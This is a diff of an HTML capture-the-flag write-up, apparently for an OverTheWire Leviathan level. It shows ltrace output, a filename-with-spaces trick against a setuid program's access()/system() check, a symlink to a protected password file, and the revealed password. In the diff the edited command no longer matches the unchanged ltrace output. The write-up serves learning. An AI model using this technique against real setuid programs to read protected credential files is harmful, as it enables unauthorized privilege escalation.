@@ -52,15 +52,15 @@ You cant have that file...</pre>
 testign.txt
 
 /tmp/shukularuni$ ltrace ~/printfile testign.txt
-__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 &lt;unfinished ...&gt;
 access("testign.txt", 4)                                                  = 0
 snprintf("/bin/cat testign.txt", 511, "/bin/cat %s", "testign.txt")       = 20
 geteuid()                                                                 = 12002
 geteuid()                                                                 = 12002
 setreuid(12002, 12002)                                                    = 0
-system("/bin/cat testign.txt" <no return ...>
+system("/bin/cat testign.txt" &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
-<... system resumed> )                                                    = 0
+&lt;... system resumed&gt; )                                                    = 0
 +++ exited (status 0) +++</pre>
             <p>So turns out the program uses cat to print the files and access for the files, a vulnerability! This is because if you enter a file with spaces in its filename and put it in it's form where it's surrounded by double quotation marks like "spaces filename.txt" it will think "spaces" and "filename.txt" are two different files, and that's important because that means it won't check for the password file from before, we can verify this with a new file and ltrace again:</p>
             <pre>/tmp/shukularuni$ touch spaces\ filename.txt
@@ -68,8 +68,8 @@ system("/bin/cat testign.txt" <no return ...>
 /tmp/shukularuni$ ls
 spaces filename.txt  testign.txt
 
-/tmp/shukularuni$ ltrace ~/printfile "pass file.txt"
-__libc_start_main(0x80490ed, 2, 0xffffd434, 0 <unfinished ...>
+/tmp/shukularuni$ ltrace ~/printfile "spaces filename.txt"
+__libc_start_main(0x80490ed, 2, 0xffffd434, 0 &lt;unfinished ...&gt;
 access("pass file.txt", 4)                                                = 0
 snprintf("/bin/cat pass file.txt", 511, "/bin/cat %s", "pass file.txt")   = 22
 geteuid()                                                                 = 12002
@@ -77,12 +77,22 @@ geteuid()                                                                 = 1200
 setreuid(12002, 12002)                                                    = 0
 system("/bin/cat pass file.txt"/bin/cat: pass: No such file or directory
 /bin/cat: file.txt: No such file or directory
- <no return ...>
+ &lt;no return ...&gt;
 --- SIGCHLD (Child exited) ---
-<... system resumed> )                                                    = 256
+&lt;... system resumed&gt; )                                                    = 256
 +++ exited (status 0) +++</pre>
-            <p>Now we just need the first one, aka "spaces", to link to the password file:</p>
-            <pre>/tmp/shukularuni$ ~/printfile "pass file.txt"
+            <p>Now we just need to link the spaces file to the password file with the ln command to link the files, and the -s option to make it a symbolic link, or in simple terms a shortcut from our spaces file to the password file:</p>
+            <pre>/tmp/shukularuni$ ln -s /etc/leviathan_pass/leviathan3 /tmp/shukularuni/spaces
+
+/tmp/shukularuni$ ls -la
+total 4368
+drwxrwxr-x    2 leviathan2 leviathan2    4096 Dec  9 13:05 .
+drwxrwx-wt 6510 root       root       4464640 Dec  9 13:05 ..
+lrwxrwxrwx    1 leviathan2 leviathan2      30 Dec  9 13:05 spaces -&gt; /etc/leviathan_pass/leviathan3
+-rw-rw-r--    1 leviathan2 leviathan2       0 Dec  9 13:04 spaces filename.txt
+-rw-rw-r--    1 leviathan2 leviathan2       0 Dec  9 13:04 testign.txt</pre>
+            <p>Now we just need the first one, aka "spaces", to link to the password file and get the password:</p>
+            <pre>/tmp/shukularuni$ ~/printfile "spaces filename.txt"
 M4nEAjAXgk
 /bin/cat: file.txt: No such file or directory</pre>
             <p>And that's our password! Now you can exit and go to the next level.</p>
